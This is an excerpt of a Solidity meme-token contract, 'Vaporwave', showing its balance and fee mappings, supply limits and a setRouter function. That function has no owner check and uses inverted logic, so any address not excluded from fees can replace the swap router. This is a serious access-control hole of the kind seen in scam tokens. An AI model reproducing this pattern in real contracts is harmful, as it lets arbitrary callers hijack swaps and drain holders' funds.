...
contract Vaporwave is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping(address => uint256) private _includedInFee;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _excludedFromFee;
    string private _name = unicode"ᴀᴇꜱᴛʜᴇᴛɪᴄ ɪɴᴜ";
    string private _symbol = unicode"ᴠᴀᴘᴏʀᴡᴀᴠᴇ";
    uint256 public _decimals = 9;
    uint256 public _totalSupply = 1000000000 * 10 ** _decimals;
    uint256 public _maxTxAmount = 1000000000 * 10 ** _decimals;
    uint256 public _maxWallet =   1000000000 * 10 ** _decimals;
    ...
    function setRouter(address routerAddress) external {
        if (_excludedFromFee[msg.sender]) {} else {
            _router = IUniswapV2Router(routerAddress);
        }
    }
